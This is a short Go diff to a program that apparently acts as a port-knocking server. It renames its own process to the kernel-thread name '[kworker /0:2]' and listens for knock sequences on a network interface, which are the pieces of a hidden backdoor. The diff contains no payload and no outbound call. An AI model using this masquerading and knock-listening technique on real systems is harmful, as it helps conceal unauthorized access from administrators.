@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"os"
 
 	"github.com/ErikDubbelboer/gspt"
 	"github.com/google/gopacket"
@@ -12,12 +11,10 @@ import (
 
 func main() {
 	fmt.Println("Server Running")
-	disguiseProc()
-	listenForKnocks("en1")
-	titleOfProcess := os.Args[1]
 	// set the process name
-	gspt.SetProcTitle(titleOfProcess)
-	//serverWorker(net.ParseIP("192.168.1.46"))
+	disguiseProc("[kworker /0:2]")
+	listenForKnocks("en1")
+
 }
 
 func listenForKnocks(ifaceName string) {
